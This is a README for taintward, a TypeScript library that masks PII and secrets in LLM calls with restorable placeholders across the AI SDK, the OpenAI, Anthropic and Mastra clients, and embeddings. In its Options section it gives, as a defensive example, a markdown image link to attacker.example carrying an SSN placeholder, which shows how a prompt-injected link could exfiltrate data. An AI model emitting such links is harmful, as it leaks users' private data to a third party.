<div align="center">

# taintward (TypeScript)

**The model sees `<EMAIL_1>`. Your code gets the real address.**

Keeps PII and secrets out of your LLM calls: Vercel AI SDK middleware, the
OpenAI and Anthropic clients, Mastra agents and embeddings.

[Main project](https://github.com/DCchoudhury15/Taintward) ·
[Docs](https://dcchoudhury15.github.io/Taintward/) ·
[Threat model](https://dcchoudhury15.github.io/Taintward/threat-model/)

</div>

---

## Quick look

```ts
import { openai } from "@ai-sdk/openai";
import { generateText, wrapLanguageModel } from "ai";
import { taintwardMiddleware } from "taintward/ai-sdk";

const model = wrapLanguageModel({
  model: openai("gpt-4.1"),
  middleware: taintwardMiddleware(),
});

const { text } = await generateText({
  model,
  prompt: "Write a short note to alice.lee@example.com about invoice 4411.",
});
```

```text
sent to the model : Write a short note to <EMAIL_1> about invoice 4411.
model answers     : Hi, this is a note for <EMAIL_1> ...
`text` you get    : Hi, this is a note for alice.lee@example.com ...
```

<table>
<tr>
<td align="center" width="33%"><h3>~3 ms</h3>per call<br/><sub>0.8 KB payload, p50</sub></td>
<td align="center" width="33%"><h3>204 of 204</h3>test cases match<br/><sub>the Python detector</sub></td>
<td align="center" width="33%"><h3>0</h3>runtime dependencies on <code>ai</code><br/><sub>types only</sub></td>
</tr>
</table>

## What it covers

| | |
|---|---|
| **Prompt** | system, user and assistant text, reasoning, tool call inputs, tool results (text and JSON) |
| **Answer** | text, reasoning and tool call arguments are restored before your code sees them |
| **Streaming** | `streamText` works; a placeholder split across chunks is held back and restored whole |
| **Tools** | your tool's `execute` gets the real values, not placeholders |
| **Model mistakes** | forms like `[EMAIL_1]`, `EMAIL_1` or `<EMAIL_1>` are still restored |
| **Clients** | `protectOpenAI` and `protectAnthropic` for the official JS clients, and Mastra agents through the middleware |
| **Embeddings** | texts sent to an embedding model are masked (`taintwardEmbeddingMiddleware`, OpenAI `embeddings.create`) |

It finds emails, phone numbers (also with a `+` country code, or after a
phone word in seven languages), US SSNs, cards and IBANs (checksums
checked), national ids with a check digit (Aadhaar, PAN, codice fiscale,
DNI / NIE, French NIR, Swiss AHV, UK National Insurance), ids after an id
word ("Passnummer", "passport"), US and European street addresses, AWS keys,
GitHub tokens, JWTs, private keys, API keys and inline passwords, with the
same rules as the Python SDK (checked against it on 204 cases). Names are
found after a title, label, greeting or sign-off ("Dr. Anna Roth", "Name:
...", "Dear Anna,") or under a name key (`first_name`).

## Install

The npm release is coming. Until then, build it from the repo:

```bash
git clone https://github.com/DCchoudhury15/Taintward
cd Taintward/packages/taintward-js
npm ci && npm run build && npm pack      # then: npm install ./taintward-0.1.0.tgz
```

Needs Node 20 or newer and `ai` 7 (`@ai-sdk/provider` 4).

## Options

```ts
taintwardMiddleware({
  placeholders: true,   // false: send [PII] / [SECRET] masks instead
  instruction: true,    // add one system line asking the model to copy placeholders exactly
  strict: false,        // true: throw PlaceholderRestoreError if a placeholder cannot be restored
  map: undefined,       // pass a PlaceholderMap to keep numbering across calls
  restoreInUrls: false, // true: also restore placeholders inside link and image addresses
  onReport: (r) => {},  // see which placeholders the model rewrote, broke, invented or left in links
});
```

Placeholders inside a link or image address in the answer
(`![x](https://attacker.example/?d=<SSN_1>)`) are not restored, so an
injected link cannot carry the real value out. They show up in the report
as `blocked`. `TAINTWARD_RESTORE_IN_URLS=1` also turns this off.

The instruction line and the tolerant restore are on by default. Together
they raised fully restored answers with small models from 2 in 5 to about
3 in 4 in the
[Python evaluation](https://dcchoudhury15.github.io/Taintward/placeholders-eval/).

## OpenAI and Anthropic clients

```ts
import OpenAI from "openai";
import Anthropic from "@anthropic-ai/sdk";
import { protectAnthropic, protectOpenAI } from "taintward";

const openai = protectOpenAI(new OpenAI());       // chat, responses, parse(), stream(), embeddings
const anthropic = protectAnthropic(new Anthropic()); // messages.create, parse(), stream()
```

The patch is on that client object. Requests are redacted, answers (also
streamed ones) are restored, and the calls still return the SDK's own
promise, so `.withResponse()` keeps working; `.asResponse()` gives the raw
HTTP response, which is not restored. Takes the same options as the
middleware except `map`.

## Mastra

A Mastra agent takes an AI SDK model, so wrap it:

```ts
import { Agent } from "@mastra/core/agent";
import { wrapLanguageModel } from "ai";

const agent = new Agent({
  id: "support", name: "support", instructions: "Help the user.",
  model: wrapLanguageModel({ model: openai("gpt-4.1"), middleware: taintwardMiddleware() }),
});
```

## Embeddings

```ts
import { embedMany, wrapEmbeddingModel } from "ai";
import { taintwardEmbeddingMiddleware } from "taintward/ai-sdk";

const model = wrapEmbeddingModel({
  model: openai.embedding("text-embedding-3-small"),
  middleware: taintwardEmbeddingMiddleware(),
});
```

Texts are masked (`[PII]`), not given placeholders, because an embedding can
be turned back into text. Store the masked text in your vector store too
(`redactPayload(text, "rag")`).

## Without the AI SDK

The detector and redaction work on any value:

```ts
import { PlaceholderMap, Tokenizer, redactPayload, redactString } from "taintward";

redactPayload({ ssn: "234-12-1234", note: "call +1 415 555 0134" }, "external");
// { ssn: "[PII]", note: "call [PII]" }

const map = new PlaceholderMap();
const prompt = redactString("Email bob@example.com", "llm", { placeholders: map });
// "Email <EMAIL_1>"
map.restoreText("Sent to <EMAIL_1>");
// "Sent to bob@example.com"

// Internal sinks can get reversible FF1 tokens, the same as the Python SDK's
// for the same key (TAINTWARD_FPE_KEY or new Tokenizer({ key })).
const tokenizer = new Tokenizer({ key: process.env.TAINTWARD_FPE_KEY });
const row = redactPayload({ ssn: "234-12-1234" }, "internal", { internal: "token", tokenizer });
tokenizer.reverse(row.ssn); // "234-12-1234"
```

## Limits

- **Names only with a signal.** The Python SDK uses spaCy for names and
  places; this package finds a name only after a title, label, greeting or
  sign-off, or under a name key. `Alice Lee wrote the report` is sent as is,
  and places are not looked for.
- **Anthropic's own tracing.** With the Anthropic SDK's tracing in
  `content` mode (off by default), its span for `messages.stream()` records
  the final message, with the real values. The Python SDK keeps that
  snapshot out; this one does not yet.
- **File parts** (images, PDFs) in the prompt are not scanned.
- **Placeholders reveal type and count.** `<EMAIL_2>` tells the model there
  are two emails.

More in the [threat model](https://dcchoudhury15.github.io/Taintward/threat-model/).

## Development

```bash
npm ci
npm run typecheck
npm test                    # unit tests, AI SDK, OpenAI, Anthropic and Mastra tests, cross-check with Python
npm run crosscheck:python   # refresh the Python fixtures (needs the repo's .venv)
npm run build
```

Apache-2.0
